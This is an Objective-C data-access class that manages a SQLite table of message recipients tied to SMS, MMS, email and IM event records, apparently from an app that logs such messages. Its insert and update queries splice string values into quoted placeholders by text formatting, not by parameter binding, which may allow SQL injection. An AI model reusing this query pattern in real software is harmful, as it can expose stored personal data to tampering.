//
//  RecipientDAO.m
//  FxSqLite
//
//  Created by Makara Khloth on 9/7/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "RecipientDAO.h"
#import "FxRecipient.h"
#import "FxRecipientWrapper.h"
#import "DAOFunction.h"
#import "FxSqlString.h"
#import "FxSqliteView.h"
#import "EventCount.h"
#import "EventBaseDAO.h"

// Select/Insert/Delete/Update/Count recipient table
static const NSString* kSelectRecipientSql		= @"SELECT * FROM recipient;";
static const NSString* kSelectWhereRecipientSql	= @"SELECT * FROM recipient WHERE id = ?;";
static const NSString* kSelectWhereSMSRecipientSql		= @"SELECT* FROM recipient WHERE sms_id = ?;";
static const NSString* kSelectWhereMMSRecipientSql		= @"SELECT* FROM recipient WHERE mms_id = ?;";
static const NSString* kSelectWhereEmailRecipientSql	= @"SELECT* FROM recipient WHERE email_id = ?;";
static const NSString* kSelectWhereIMRecipientSql		= @"SELECT* FROM recipient WHERE im_id = ?;";
static const NSString* kInsertRecipientSql		= @"INSERT INTO recipient VALUES(NULL, ?, '?', '?', ?, ?, ?, ?);";
static const NSString* kDeleteRecipientSql		= @"DELETE FROM recipient WHERE id = ?;";
static const NSString* kUpdateRecipientSql		= @"UPDATE recipient SET recipient_type = ?,"
															"recipient = '?',"
															"contact_name = '?',"
															"sms_id = ?,"
															"mms_id = ?,"
															"email_id = ?,"
															"im_id = ?"
															" WHERE id = ?;";
static const NSString* kCountAllRecipientSql	= @"SELECT Count(*) FROM recipient;";

@implementation RecipientDAO

- (id) initWithSqlite3: (sqlite3*) newSqlite3Database
{
	if (self = [super init])
	{
		sqliteDatabase = newSqlite3Database;
	}
	return (self);
}

- (void) dealloc
{
	[super dealloc];
}

- (NSInteger) deleteRow: (NSInteger) rowId
{
	NSInteger numRowDeleted = 0;
	FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRecipientSql];
	[sqlString formatInt:rowId atIndex:0];
	const NSString* sqlStatement = [sqlString finalizeSqlString];
	[sqlString release];
	[DAOFunction execDML:sqliteDatabase withSqlStatement:sqlStatement];
	numRowDeleted++;
	return (numRowDeleted);
}

- (NSInteger) insertRow: (id) row
{
	NSInteger numRowInserted = 0;
	FxRecipientWrapper* newRow = row;
	FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kInsertRecipientSql];
	[sqlString formatInt:newRow.recipient.recipType atIndex:0];
	[sqlString formatString:newRow.recipient.recipNumAddr atIndex:1];
	[sqlString formatString:newRow.recipient.recipContactName atIndex:2];
	[sqlString formatInt:newRow.smsId atIndex:3];
	[sqlString formatInt:newRow.mmsId atIndex:4];
	[sqlString formatInt:newRow.emailId atIndex:5];
	[sqlString formatInt:newRow.mIMID atIndex:6];
	const NSString* sqlStatement = [sqlString finalizeSqlString];
	[sqlString release];
	[DAOFunction execDML:sqliteDatabase withSqlStatement:sqlStatement];
	numRowInserted++;
	return (numRowInserted);
}

- (id) selectRow: (NSInteger) rowId
{
	FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kSelectWhereRecipientSql];
	[sqlString formatInt:rowId atIndex:0];
	const NSString* sqlStatement = [sqlString finalizeSqlString];
	[sqlString release];
	FxSqliteView* fxSqliteView = [DAOFunction execQuery:sqliteDatabase withSqlStatement:sqlStatement];
    FxRecipientWrapper* newRow = [[FxRecipientWrapper alloc] init];
	FxRecipient* recipient = [[FxRecipient alloc] init];
	recipient.dbId = [fxSqliteView intFieldValue:0];
	recipient.recipType = (FxRecipientType)[fxSqliteView intFieldValue:1];
	recipient.recipNumAddr = [fxSqliteView stringFieldValue:2];
	recipient.recipContactName = [fxSqliteView stringFieldValue:3];
	newRow.smsId = [fxSqliteView intFieldValue:4];
	newRow.mmsId = [fxSqliteView intFieldValue:5];
	newRow.emailId = [fxSqliteView intFieldValue:6];
	newRow.mIMID = [fxSqliteView intFieldValue:7];
	newRow.recipient = recipient;
	[recipient release];
    [fxSqliteView done];
	[newRow autorelease];
	return (newRow);
}

- (NSArray*) selectMaxRow: (NSInteger) maxRow
{
	NSMutableArray* rowArrays = [[NSMutableArray alloc] init];
	FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kSelectRecipientSql];
	const NSString* sqlStatement = [sqlString finalizeSqlString];
	[sqlString release];
	FxSqliteView* fxSqliteView = [DAOFunction execQuery:sqliteDatabase withSqlStatement:sqlStatement];
	NSInteger count = 0;
	while (count < maxRow && !fxSqliteView.eof)
	{
		FxRecipientWrapper* newRow = [[FxRecipientWrapper alloc] init];
		FxRecipient* recipient = [[FxRecipient alloc] init];
		recipient.dbId = [fxSqliteView intFieldValue:0];
		recipient.recipType = (FxRecipientType)[fxSqliteView intFieldValue:1];
		recipient.recipNumAddr = [fxSqliteView stringFieldValue:2];
		recipient.recipContactName = [fxSqliteView stringFieldValue:3];
		newRow.smsId = [fxSqliteView intFieldValue:4];
		newRow.mmsId = [fxSqliteView intFieldValue:5];
		newRow.emailId = [fxSqliteView intFieldValue:6];
		newRow.mIMID = [fxSqliteView intFieldValue:7];
		newRow.recipient = recipient;
		[recipient release];
		[rowArrays addObject:newRow];
		[newRow release];
		count++;
		[fxSqliteView nextRow];
	}
	[fxSqliteView done];
	[rowArrays autorelease];
	return (rowArrays);
}

- (NSInteger) updateRow: (id) row
{
	NSInteger numRowUpdated = 0;
	FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kUpdateRecipientSql];
	FxRecipientWrapper* recipWrapper = row;
	[sqlString formatInt:recipWrapper.recipient.recipType atIndex:0];
	[sqlString formatString:recipWrapper.recipient.recipNumAddr atIndex:1];
	[sqlString formatString:recipWrapper.recipient.recipContactName atIndex:2];
	[sqlString formatInt:recipWrapper.smsId atIndex:3];
	[sqlString formatInt:recipWrapper.mmsId atIndex:4];
	[sqlString formatInt:recipWrapper.emailId atIndex:5];
	[sqlString formatInt:recipWrapper.mIMID atIndex:6];
	[sqlString formatInt:recipWrapper.recipient.dbId atIndex:7];
	const NSString* sqlStatement = [sqlString finalizeSqlString];
	[sqlString release];
	[DAOFunction execDML:sqliteDatabase withSqlStatement:sqlStatement];
	numRowUpdated++;
	return (numRowUpdated);
}

- (NSInteger) countRow
{
	NSInteger rowCount = [DAOFunction execScalar:sqliteDatabase withSqlStatement:kCountAllRecipientSql];
	return (rowCount);
}

- (EventCount*) countAllEvent {
	EventBaseDAO* eventBaseDAO = [[EventBaseDAO alloc] initWithSqlite3:sqliteDatabase];
	EventCount* eventCount = [eventBaseDAO countAllEvent];
	[eventBaseDAO release];
	return (eventCount);
}

- (NSUInteger) totalEventCount {
	EventBaseDAO* eventBaseDAO = [[EventBaseDAO alloc] initWithSqlite3:sqliteDatabase];
	NSInteger totalEventCount = [eventBaseDAO totalEventCount];
	[eventBaseDAO release];
	return (totalEventCount);
}

- (void) executeSql: (NSString*) aSqlStatement {
	EventBaseDAO* eventBaseDAO = [[EventBaseDAO alloc] initWithSqlite3:sqliteDatabase];
	[eventBaseDAO executeSql:aSqlStatement];
	[eventBaseDAO release];
}

- (id) selectRow: (NSInteger) aEventTypeId andEventType: (NSInteger) aEventType {
	NSMutableArray* rowArrays = [[NSMutableArray alloc] init];
	FxSqlString* sqlString = nil;
	switch (aEventType) {
		case kEventTypeMms: {
			sqlString = [[FxSqlString alloc] initWithSqlFormat:kSelectWhereMMSRecipientSql];
		} break;
        case kEventTypeEmailMacOS:
		case kEventTypeMail: {
			sqlString = [[FxSqlString alloc] initWithSqlFormat:kSelectWhereEmailRecipientSql];
		} break;
		case kEventTypeSms: {
			sqlString = [[FxSqlString alloc] initWithSqlFormat:kSelectWhereSMSRecipientSql];
		} break;
		case kEventTypeIM: {
			sqlString = [[FxSqlString alloc] initWithSqlFormat:kSelectWhereIMRecipientSql];
		} break;
		default: {
		} break;
	}
	[sqlString formatInt:aEventTypeId atIndex:0];
	const NSString* sqlStatement = [sqlString finalizeSqlString];
	[sqlString release];
	FxSqliteView* fxSqliteView = [DAOFunction execQuery:sqliteDatabase withSqlStatement:sqlStatement];
    while (!fxSqliteView.eof) {
        FxRecipientWrapper* newRow = [[FxRecipientWrapper alloc] init];
		FxRecipient* recipient = [[FxRecipient alloc] init];
		recipient.dbId = [fxSqliteView intFieldValue:0];
		recipient.recipType = (FxRecipientType)[fxSqliteView intFieldValue:1];
		recipient.recipNumAddr = [fxSqliteView stringFieldValue:2];
		recipient.recipContactName = [fxSqliteView stringFieldValue:3];
		newRow.smsId = [fxSqliteView intFieldValue:4];
		newRow.mmsId = [fxSqliteView intFieldValue:5];
		newRow.emailId = [fxSqliteView intFieldValue:6];
		newRow.mIMID = [fxSqliteView intFieldValue:7];
		newRow.recipient = recipient;
		[recipient release];
        [rowArrays addObject:newRow];
        [newRow release];
        [fxSqliteView nextRow];
    }
	[fxSqliteView done];
	[rowArrays autorelease];
	return (rowArrays);
}

@end
